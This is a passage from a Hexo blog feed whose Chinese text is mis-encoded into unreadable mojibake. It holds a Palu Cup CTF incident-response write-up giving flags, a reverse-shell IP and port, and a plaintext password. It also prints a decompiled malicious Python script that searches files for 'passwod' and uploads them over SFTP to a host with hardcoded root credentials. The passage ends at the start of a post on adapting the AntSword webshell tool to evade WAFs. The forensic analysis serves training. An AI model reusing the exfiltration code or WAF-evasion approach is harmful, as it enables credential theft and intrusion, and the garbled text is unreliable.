src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422151302325.png" alt="image-20240422151302325"></p><p>vtå¯ä»¥</p><blockquote><p>flag 101.78.63.44</p></blockquote><h2 id="åº”æ€¥å“åº”-33"><a href="#åº”æ€¥å“åº”-33" class="headerlink" title="åº”æ€¥å“åº”-33"></a>åº”æ€¥å“åº”-33</h2><p><strong>é¢˜ç›®è¦æ±‚ï¼š</strong><br>æäº¤æ”»å‡»è€…ä½¿ç”¨å†…ç½‘æ‰«æå·¥å…·çš„å“ˆå¸Œã€‚</p><hr><p><strong>æäº¤æ ¼å¼ï¼š</strong><br>[xxxx]</p><p>åæ§½ä¸€ä¸‹ï¼Œè¿™åˆ°äº†pcï¼Œç„¶ååˆå›åˆ°äº†æœåŠ¡å™¨ï¼Œæœ‰ç‚¹è’™åœˆ</p><p>root@debian:/usr/bin# md5sum fscan<br>1facdcd05c43ba4d37274dffc90b6d4e  fscan</p><blockquote><p>1facdcd05c43ba4d37274dffc90b6d4e  </p></blockquote><h2 id="åº”æ€¥å“åº”-34"><a href="#åº”æ€¥å“åº”-34" class="headerlink" title="åº”æ€¥å“åº”-34"></a>åº”æ€¥å“åº”-34</h2><p><strong>é¢˜ç›®è¦æ±‚ï¼š</strong><br>è¯·æäº¤æ”»å‡»è€…åœ¨ç«™ç‚¹ä¸Šç•™ä¸‹çš„åé—¨å¯†ç ã€‚</p><hr><p><strong>æäº¤æ ¼å¼ï¼š</strong><br>[md5(xxxx)]</p><p>åé—¨çš„è¯ï¼Œåœ¨index.phpä¸­ï¼Œ<br>wafä¸­å¯çœ‹åˆ°æ‰§è¡Œäº†å‘½ä»¤</p><blockquote><p>flag 123</p></blockquote><h2 id="åº”æ€¥å“åº”-35"><a href="#åº”æ€¥å“åº”-35" class="headerlink" title="åº”æ€¥å“åº”-35"></a>åº”æ€¥å“åº”-35</h2><p><strong>é¢˜ç›®è¦æ±‚ï¼š</strong><br>è¯·æäº¤æ”»å‡»è€…åœ¨æ•°æ®åº“ç•™ä¸‹çš„ä¿¡æ¯ã€‚</p><hr><p><strong>æäº¤æ ¼å¼ï¼š</strong><br>[xxxx]</p><p>è¿˜æ˜¯ç›´æ¥ç”¨navicatè¿æ•°æ®åº“æ¯”è¾ƒå¥½ï¼Œå‘½ä»¤è¡Œèƒ½ç¿»ä¸€å¹´<br>MySQL [ultrax]&gt; select * from pre_ucenter_vars;<br>+â€”â€”â€”â€”â€”â€“+â€”â€”-+<br>| name            | value |<br>+â€”â€”â€”â€”â€”â€“+â€”â€”-+<br>| flag{hack_palu} | 0     |<br>| noteexists      | 0     |<br>| noteexists1     | 0     |<br>+â€”â€”â€”â€”â€”â€“+â€”â€”-+<br>3 rows in set (0.001 sec)</p><p>MySQL [ultrax]&gt; </p><blockquote><p>flag{hack_palu} </p></blockquote><h2 id="åº”æ€¥å“åº”-36"><a href="#åº”æ€¥å“åº”-36" class="headerlink" title="åº”æ€¥å“åº”-36"></a>åº”æ€¥å“åº”-36</h2><p><strong>é¢˜ç›®è¦æ±‚ï¼š</strong><br>æäº¤æ”»å‡»è€…åœ¨ç›‘æ§æœåŠ¡å™¨ä¸Šç•™ä¸‹çš„dcnlogåœ°å€ã€‚</p><hr><p><strong>æäº¤æ ¼å¼ï¼š</strong><br>[xxx.xx.xx]</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422160601984.png" alt="image-20240422160601984"></p><p>è¿›å…¥åˆ°zabbixçš„æ•°æ®åº“ï¼Œä¹Ÿå°±æ˜¯æ•°æ®åº“2ï¼Œå¯ä»¥æŸ¥åˆ°passwdæŸ¥ä¸€ä¸‹ä¸ºåŸå¯†ç </p><p>Admin/zabbix<br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422161004820.png" alt="image-20240422161004820"></p><p>åœ¨è„šæœ¬ä¸­æœ‰åœ°å€</p><blockquote><p>palu.dcnlog.cn</p></blockquote><h2 id="åº”æ€¥å“åº”-37"><a href="#åº”æ€¥å“åº”-37" class="headerlink" title="åº”æ€¥å“åº”-37"></a>åº”æ€¥å“åº”-37</h2><p><strong>é¢˜ç›®è¦æ±‚ï¼š</strong><br>æäº¤ç›‘æ§æœåŠ¡å™¨ä¸Šæ¶æ„ç”¨æˆ·çš„ä¸Šä¸€æ¬¡ç™»å½•æ—¶é—´ã€‚</p><hr><p><strong>æäº¤æ ¼å¼ï¼š</strong><br>[xx/xx/xx/xx:xx:xx]</p><p>ç”¨æˆ·ä¸­æœ‰è¿™ä¸ªç™»å½•è®°å½•</p><p>ä¸ (2024-04-17 01:32:44)</p><blockquote><p>2024-04-17 01:32:44</p></blockquote><h2 id="åº”æ€¥å“åº”-38"><a href="#åº”æ€¥å“åº”-38" class="headerlink" title="åº”æ€¥å“åº”-38"></a>åº”æ€¥å“åº”-38</h2><p><strong>é¢˜ç›®è¦æ±‚ï¼š</strong><br>æäº¤ç›‘æ§æœåŠ¡å™¨ä¸Šé—ç•™çš„åå¼¹shellåœ°å€å’Œç«¯å£ã€‚</p><hr><p><strong>æäº¤æ ¼å¼ï¼š</strong><br>[xxxx:xx]</p><p>è§£ä¸€ä¸‹base64å³å¯</p><blockquote><p>154.183.110.12:7890</p></blockquote><h2 id="åº”æ€¥å“åº”-39"><a href="#åº”æ€¥å“åº”-39" class="headerlink" title="åº”æ€¥å“åº”-39"></a>åº”æ€¥å“åº”-39</h2><p><strong>é¢˜ç›®è¦æ±‚ï¼š</strong><br>æäº¤æ¶æ„é’“é±¼æ–‡ä»¶çš„å“ˆå¸Œã€‚</p><hr><p><strong>æäº¤æ ¼å¼ï¼š</strong><br>[xxxx]</p><p>pc2ä¸Šæœ‰ä¸€ä¸ªdocxæ–‡ä»¶ï¼Œåº”è¯¥æ˜¯ç”¨äº†è°ƒç”¨çš„</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422162222877.png" alt="image-20240422162222877"></p><h2 id="åº”æ€¥å“åº”-40"><a href="#åº”æ€¥å“åº”-40" class="headerlink" title="åº”æ€¥å“åº”-40"></a>åº”æ€¥å“åº”-40</h2><p><strong>é¢˜ç›®è¦æ±‚ï¼š</strong><br>æäº¤æ¶æ„æ–‡ä»¶å¤–è¿IPã€‚</p><hr><p><strong>æäº¤æ ¼å¼ï¼š</strong><br>[xxx]</p><h2 id="åº”æ€¥å“åº”-41"><a href="#åº”æ€¥å“åº”-41" class="headerlink" title="åº”æ€¥å“åº”-41"></a>åº”æ€¥å“åº”-41</h2><p><strong>é¢˜ç›®è¦æ±‚ï¼š</strong><br>æäº¤è¢«æ¶æ„æ–‡ä»¶é’“é±¼ä½¿ç”¨è€…çš„å§“åã€‚</p><hr><p><strong>æäº¤æ ¼å¼ï¼š</strong><br>[xxx]</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422162758559.png" alt="image-20240422162758559"></p><h2 id="åº”æ€¥å“åº”-42"><a href="#åº”æ€¥å“åº”-42" class="headerlink" title="åº”æ€¥å“åº”-42"></a>åº”æ€¥å“åº”-42</h2><p><strong>é¢˜ç›®è¦æ±‚ï¼š</strong><br>æäº¤æ”»å‡»è€…ç•™ä¸‹çš„ä¿¡æ¯ã€‚</p><hr><p><strong>æäº¤æ ¼å¼ï¼š</strong><br>[xxxx]</p><p>zè¿™é‡Œï¼Œæˆ‘ä»¬æ‰¾åˆ°jumpserverçš„å½•åƒï¼Œæˆ‘ç¬¬ä¸€æ¬¡çŸ¥é“è¿™ä¸œè¥¿è¿˜æœ‰å½•åƒåŠŸèƒ½<br>é¦–å…ˆåˆ°jumpçš„ç›®å½•æ‰¾åˆ°config.txt</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422172534548.png" alt="image-20240422172534548"></p><p>çœ‹åˆ°å½•åƒçš„ä½ç½®</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422172559581.png" alt="image-20240422172559581"></p><p>ç„¶åä¸Šè¿™é‡Œç…§å½•è±¡</p><p>/data/jumpserver/core/data/media/replay</p><p>å½•åƒå¾ˆå¤šï¼Œè¦ç­›é€‰ä¸€ä¸‹ï¼Œæˆ‘ä»¬çŒœæµ‹å¤§æ¦‚åœ¨4.16-17è¿›è¡Œçš„æ¸—é€<br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422172751520.png" alt="image-20240422172751520"></p><p>åœ¨4.17æœ‰å¾ˆå¤šå½•åƒï¼Œè¿™é‡Œæ³¨æ„castçš„æ˜¯linuxå½•åƒ</p><p>replayæ˜¯winå½•åƒ<br>æ‰¾åˆ°è¿™ä¸ªæ‰“çš„ï¼Œ9.3mçš„å¯¼å‡ºæ¥<br><code>https://player.glyptodon.com/</code></p><p>åœ¨è¿™ä¸ªç½‘ç«™æ‰“å¼€ï¼Œæ–‡ä»¶ï¼Œçœ‹åˆ°5ï¼š11å·¦å³ï¼Œå¯ä»¥çœ‹åˆ°å†™äº†ä¸ªæ³¨å†Œè¡¨</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422172131659.png" alt="image-20240422172131659"></p><blockquote><p>flag:flag{2024-04-17-hi}</p></blockquote><h2 id="åº”æ€¥å“åº”-43"><a href="#åº”æ€¥å“åº”-43" class="headerlink" title="åº”æ€¥å“åº”-43"></a>åº”æ€¥å“åº”-43</h2><p><strong>é¢˜ç›®è¦æ±‚ï¼š</strong><br>æäº¤æ¶æ„ç”¨æˆ·æ•°é‡ã€‚</p><hr><p><strong>æäº¤æ ¼å¼ï¼š</strong><br>[md5(xxxx)]</p><p>ç†è®ºä¸Šæ¥è¯´ï¼Œé‚£äº›ç”¨æˆ·åéƒ½ä¸ç®—ï¼Œæ˜¯ç”¨æˆ·å<br>è€Œadminè¿™äº›æ˜¯ç”¨æˆ·ï¼Œä¸ç†è§£<br>é‚£ä¸€å…±æ˜¯49ä¸ª</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422173631566.png" alt="image-20240422173631566"></p><blockquote><p>flag:49</p></blockquote><h2 id="åº”æ€¥å“åº”-44"><a href="#åº”æ€¥å“åº”-44" class="headerlink" title="åº”æ€¥å“åº”-44"></a>åº”æ€¥å“åº”-44</h2><p><strong>é¢˜ç›®è¦æ±‚ï¼š</strong><br>è¯·æäº¤å‘˜å·¥é›†ä½“ä½¿ç”¨çš„å¯†ç ã€‚</p><hr><p><strong>æäº¤æ ¼å¼ï¼š</strong><br>[xxxx]</p><p>åœ¨15ï¼š02çš„æ—¶å€™ï¼Œå¯ä»¥çœ‹åˆ°è®¾ç½®äº†å¯†ç </p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422173847516.png" alt="image-20240422173847516"></p><blockquote><p>Network@2020</p></blockquote><h2 id="åº”æ€¥å“åº”-45"><a href="#åº”æ€¥å“åº”-45" class="headerlink" title="åº”æ€¥å“åº”-45"></a>åº”æ€¥å“åº”-45</h2><p><strong>é¢˜ç›®è¦æ±‚ï¼š</strong><br>æäº¤åŠ å¯†æ–‡ä»¶çš„å“ˆå¸Œã€‚</p><hr><p><strong>æäº¤æ ¼å¼ï¼š</strong><br>[xxxx]</p><p>åŠ å¯†æ–‡ä»¶å°±æ˜¯encodeã€‚txt<br>hashä¸€ä¸‹</p><p>PS C:\Users\Administrator\Documents&gt; certutil -hashfile .\encode.txt md5<br>MD5 çš„ .\encode.txt å“ˆå¸Œ:<br>dc040203e9122e89ee44ddc85058795a<br>CertUtil: -hashfile å‘½ä»¤æˆåŠŸå®Œæˆã€‚<br>PS C:\Users\Administrator\Documents&gt;</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422174044841.png" alt="image-20240422174044841"></p><blockquote><p>dc040203e9122e89ee44ddc85058795a</p></blockquote><h2 id="åº”æ€¥å“åº”-46"><a href="#åº”æ€¥å“åº”-46" class="headerlink" title="åº”æ€¥å“åº”-46"></a>åº”æ€¥å“åº”-46</h2><p><strong>é¢˜ç›®è¦æ±‚ï¼š</strong><br>æäº¤è¢«æ”»å‡»è€…åŠ å¯†çš„å†…å®¹æ˜æ–‡ã€‚</p><hr><p><strong>æäº¤æ ¼å¼ï¼š</strong><br>[xxxx]</p><p><a href="https://www.ddosi.org/drt-aav/">https://www.ddosi.org/drt-aav/</a></p><p>è¿™ä¸ªç½‘ç«™ç»™äº†ç è¡¨ï¼Œå¯¹ä¸€ä¸‹å°±è¡Œ</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422174049892.png" alt="image-20240422174049892"></p><blockquote><p>flag:2024ispassword</p></blockquote><h2 id="åº”æ€¥å“åº”-47"><a href="#åº”æ€¥å“åº”-47" class="headerlink" title="åº”æ€¥å“åº”-47"></a>åº”æ€¥å“åº”-47</h2><p><strong>é¢˜ç›®è¦æ±‚ï¼š</strong><br>è¯·æäº¤ç¬¦åˆåŸºçº¿æ ‡å‡†çš„æœåŠ¡å™¨æ•°é‡ã€‚</p><hr><p><strong>æäº¤æ ¼å¼ï¼š</strong><br>[md5(xx)]</p><p>ä¸æ‡‚ï¼Œæˆ‘çœ‹zabbixä¸Šå°±ä¸€å°æœºå™¨<br>webserver</p><blockquote><p>0</p></blockquote><h2 id="åº”æ€¥å“åº”-48"><a href="#åº”æ€¥å“åº”-48" class="headerlink" title="åº”æ€¥å“åº”-48"></a>åº”æ€¥å“åº”-48</h2><p><strong>é¢˜ç›®è¦æ±‚ï¼š</strong><br>æäº¤åŠå…¬åŒºçš„æ¶æ„æ–‡ä»¶å“ˆå¸Œã€‚</p><hr><p><strong>æäº¤æ ¼å¼ï¼š</strong><br>[xxx]</p><p>åœ¨jumpä¸Šé¢å¯ä»¥çœ‹åˆ°4ã€17ä¸Šä¼ äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œä½†æ˜¯æ¡Œé¢ä¸Šæˆ‘ä»¬å¹¶æ²¡æœ‰çœ‹åˆ°ï¼Œå¯èƒ½å°±æ˜¯æ¶æ„æ–‡ä»¶äº†</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240423084615143.png" alt="image-20240423084615143"></p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240423084729345.png" alt="image-20240423084729345"></p><p>æœä¸€ä¸‹ï¼Œçœ‹èµ·æ¥æ˜¯ä¸ªpythonçš„æ–‡ä»¶</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240423084858362.png" alt="image-20240423084858362"></p><blockquote><p>5232a191eb2913337e0a93b0a990f2a2</p></blockquote><h2 id="åº”æ€¥å“åº”-49"><a href="#åº”æ€¥å“åº”-49" class="headerlink" title="åº”æ€¥å“åº”-49"></a>åº”æ€¥å“åº”-49</h2><p><strong>é¢˜ç›®è¦æ±‚ï¼š</strong><br>æäº¤æ¶æ„å›è¿ç«¯å£ã€‚</p><hr><p><strong>æäº¤æ ¼å¼ï¼š</strong><br>[xxx]</p><p>ç®€å•pyé€†å‘äº†</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240423085055511.png" alt="image-20240423085055511"></p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240423085236855.png" alt="image-20240423085236855"></p><p>è®²pycåˆ°ç½‘ç«™è§£ä¸€ä¸‹å°±è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit https://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="comment"># Version: Python 3.8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"><span class="keyword">from</span> getpass <span class="keyword">import</span> getpass</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search_in_files</span>(<span class="params">directory, search_text</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># WARNING: Decompyle incomplete</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ssh</span>(<span class="params">local_file_path, remote_file_path</span>):</span></span><br><span class="line">    hostname = <span class="string">&#x27;192.168.20.123&#x27;</span></span><br><span class="line">    port = <span class="number">22</span></span><br><span class="line">    username = <span class="string">&#x27;root&#x27;</span></span><br><span class="line">    password = <span class="string">&#x27;Network@2020&#x27;</span></span><br><span class="line">    client = paramiko.SSHClient()</span><br><span class="line">    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line">    client.connect(hostname, port, username, password)</span><br><span class="line">    sftp = client.open_sftp()</span><br><span class="line">    sftp.put(local_file_path, remote_file_path)</span><br><span class="line">    sftp.close()</span><br><span class="line">    client.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;&#x27;&#x27;File <span class="subst">&#123;local_file_path&#125;</span> uploaded to <span class="subst">&#123;remote_file_path&#125;</span> on <span class="subst">&#123;hostname&#125;</span>&#x27;&#x27;&#x27;</span>)</span><br><span class="line">    flag = <span class="string">&#x27;flag&#123;234567uyhgn_aiduyai&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">search_directory = <span class="string">&#x27;/&#x27;</span></span><br><span class="line">search_for_text = <span class="string">&#x27;passwod&#x27;</span></span><br><span class="line">(a, b) = search_in_files(search_directory, search_for_text)</span><br><span class="line">ssh(a, b)</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>22</p></blockquote><h2 id="åº”æ€¥å“åº”-50"><a href="#åº”æ€¥å“åº”-50" class="headerlink" title="åº”æ€¥å“åº”-50"></a>åº”æ€¥å“åº”-50</h2><p><strong>é¢˜ç›®è¦æ±‚ï¼š</strong><br>æäº¤æ¶æ„ç¨‹åºä¸­çš„flagã€‚</p><hr><p><strong>æäº¤æ ¼å¼ï¼š</strong><br>[xxx]</p><blockquote><p> flag{234567uyhgn_aiduyai}</p></blockquote><h2 id="åº”æ€¥å“åº”-51"><a href="#åº”æ€¥å“åº”-51" class="headerlink" title="åº”æ€¥å“åº”-51"></a>åº”æ€¥å“åº”-51</h2><p><strong>é¢˜ç›®è¦æ±‚ï¼š</strong><br>æäº¤æ¶æ„æ–‡ä»¶ä¸­çš„search_for_textå†…å®¹ã€‚</p><hr><p><strong>æäº¤æ ¼å¼ï¼š</strong><br>[xxxx]</p><blockquote><p>passwod</p></blockquote><h2 id="åº”æ€¥å“åº”-52"><a href="#åº”æ€¥å“åº”-52" class="headerlink" title="åº”æ€¥å“åº”-52"></a>åº”æ€¥å“åº”-52</h2><p><strong>é¢˜ç›®è¦æ±‚ï¼š</strong><br>æäº¤webæœåŠ¡å™¨ä¸Šæ”»å‡»è€…ä¿®æ”¹åçš„rootå¯†ç ã€‚</p><hr><p><strong>æäº¤æ ¼å¼ï¼š</strong><br>[xxxx]</p><p>å°±æ˜¯ä¸Šé¢pyé‡Œçš„å¯†ç </p><blockquote><p> Network@2020</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>antsword-bypasswaf</title>
      <link href="/2024/02/28/antsword-bypasswaf/antsword-bypasswaf/"/>
      <url>/2024/02/28/antsword-bypasswaf/antsword-bypasswaf/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/antsword-bypasswaf/image-20240301085541693.png" alt="image-20240301085541693"></p><h4 id="antsword-phpæ”¹é€ "><a href="#antsword-phpæ”¹é€ " class="headerlink" title="antsword-phpæ”¹é€ "></a>antsword-phpæ”¹é€ </h4><h5 id="1-å‰ç½®çŸ¥è¯†"><a href="#1-å‰ç½®çŸ¥è¯†" class="headerlink" title="1.å‰ç½®çŸ¥è¯†"></a>1.å‰ç½®çŸ¥è¯†</h5><p>è¿™é‡Œç¬”è€…ä¸åœ¨è®²è§£antswordçš„åŠŸèƒ½ç­‰ç­‰äº†ï¼Œè¿™é‡Œç›´æ¥çœ‹ä¸€ä¸‹èšå‰‘çš„æ ¸å¿ƒæ–‡ä»¶ã€‚</p><p><img src="/images/antsword-bypasswaf/image-20240301090748514.png" alt="image-20240301090748514"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"># $ tree -l 1 -d ./</span><br><span class="line">â”€â”€ base</span><br><span class="line">â”œâ”€â”€ core</span><br><span class="line">â”‚   â”œâ”€â”€ asp</span><br><span class="line">â”‚   â”‚   â”œâ”€â”€ decoder</span><br><span class="line">â”‚   â”‚   â”œâ”€â”€ encoder</span><br><span class="line">â”‚   â”‚   â””â”€â”€ template</span><br><span class="line">â”‚   â”‚       â””â”€â”€ database</span><br><span class="line">â”‚   â”œâ”€â”€ aspx</span><br><span class="line">â”‚   â”‚   â”œâ”€â”€ decoder</span><br><span class="line">â”‚   â”‚   â”œâ”€â”€ encoder</span><br><span class="line">â”‚   â”‚   â””â”€â”€ template</span><br><span class="line">â”‚   â”‚       â””â”€â”€ database</span><br><span class="line">â”‚   â”œâ”€â”€ custom</span><br><span class="line">â”‚   â”‚   â”œâ”€â”€ decoder</span><br><span class="line">â”‚   â”‚   â”œâ”€â”€ encoder</span><br><span class="line">â”‚   â”‚   â””â”€â”€ template</span><br><span class="line">â”‚   â”‚       â””â”€â”€ database</span><br><span class="line">â”‚   â”œâ”€â”€ php</span><br><span class="line">â”‚   â”‚   â”œâ”€â”€ decoder</span><br><span class="line">â”‚   â”‚   â”œâ”€â”€ encoder</span><br><span class="line">â”‚   â”‚   â””â”€â”€ template</span><br><span class="line">â”‚   â”‚       â””â”€â”€ database</span><br><span class="line">â”‚   â””â”€â”€ php4</span><br><span class="line">â”œâ”€â”€ language</span><br><span class="line">â”œâ”€â”€ modules</span><br><span class="line">â”‚   â”œâ”€â”€ database</span><br><span class="line">â”‚   â”‚   â”œâ”€â”€ asp</span><br><span class="line">â”‚   â”‚   â”œâ”€â”€ aspx</span><br><span class="line">â”‚   â”‚   â”œâ”€â”€ custom</span><br><span class="line">â”‚   â”‚   â””â”€â”€ php</span><br><span class="line">â”‚   â”œâ”€â”€ filemanager</span><br><span class="line">â”‚   â”œâ”€â”€ plugin</span><br><span class="line">â”‚   â”œâ”€â”€ settings</span><br><span class="line">â”‚   â”œâ”€â”€ shellmanager</span><br><span class="line">â”‚   â”‚   â”œâ”€â”€ category</span><br><span class="line">â”‚   â”‚   â””â”€â”€ list</span><br><span class="line">â”‚   â”œâ”€â”€ terminal</span><br><span class="line">â”‚   â””â”€â”€ viewsite</span><br><span class="line">â””â”€â”€ ui</span><br><span class="line"></span><br><span class="line">coreä¸‹é¢æ—¶æ ¸å¿ƒä»£ç ï¼Œæ¯ç§è¯­è¨€çš„çš„ç¼–ç è§£ç åŠæ“ä½œç­‰ç­‰ï¼Œå› ä¸ºç¬”è€…å¯¹phpæ¯”è¾ƒç†Ÿæ‚‰ï¼Œæ‰€ä»¥è¿™é‡Œå…ˆå¯¹phpçš„ç¼–è§£ç è¿›è¡Œç¼–å†™</span><br></pre></td></tr></table></figure><p>core-&gt;php-&gt;index.jsæ˜¯<em>PHPæœåŠ¡ç«¯è„šæœ¬æ¨¡æ¿</em><br>å…¶ä¸­å…³é”®ä»£ç åœ¨100è¡Œå·¦å³ï¼Œä¸ºå½“æˆ‘ä»¬ä¸æœåŠ¡ç«¯è¿›è¡Œé€šä¿¡æ—¶æ‰€ä¼ é€’çš„ä»£ç <br><img src="/images/antsword-bypasswaf/image-20240301091117143.png" alt="image-20240301091117143"></p><p>126è¡Œä¹Ÿæ˜¯ï¼Œè¿™ä¸ªdata[â€˜_â€™]å°±æ˜¯æˆ‘ä»¬åœ¨å°†æ•°æ®å‘é€ç»™æœåŠ¡ç«¯çš„æ¨¡æ¿ï¼Œç›¸ä¿¡å¤§å®¶å·²ç»çœ‹åˆ°äº†<br>``@ini_set(â€œdisplay_errorsâ€, â€œ0â€ï¼Œ`ç»å…¸å¼€å¤´</p><p><img src="/images/antsword-bypasswaf/image-20240301091144060.png" alt="image-20240301091144060"></p><p>åœ¨ä¼ è¾“ä¸­çš„æ ·å­</p><p><img src="/images/antsword-bypasswaf/image-20240301091543492.png" alt="image-20240301091543492"></p><h5 id="2-phpä¸‹çš„æ–‡ä»¶å¤§è‡´ä»‹ç»"><a href="#2-phpä¸‹çš„æ–‡ä»¶å¤§è‡´ä»‹ç»" 